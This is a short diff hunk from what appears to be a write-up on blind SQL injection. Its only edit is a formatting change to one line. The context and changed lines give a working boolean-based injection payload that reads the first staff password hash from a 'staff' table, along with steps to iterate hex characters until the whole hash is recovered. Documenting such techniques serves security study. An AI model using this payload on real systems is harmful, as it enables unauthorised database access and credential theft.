@@ -378,7 +378,7 @@ does not return site properly -> not 32
 returns site properly -> password hash is sha1
 
 check if first character of the password hash is 'a'
-```&param[]=6 and (substr((select password from staff limit 0,1 ),1,1)) = 'a'-- -```
+```&param[]=6 and (substr((select password from staff limit 0,1 ),1,1)) = 'a'-- -```\
 iterate a->f 0->9 until request returns site properly
 
 check for second character:
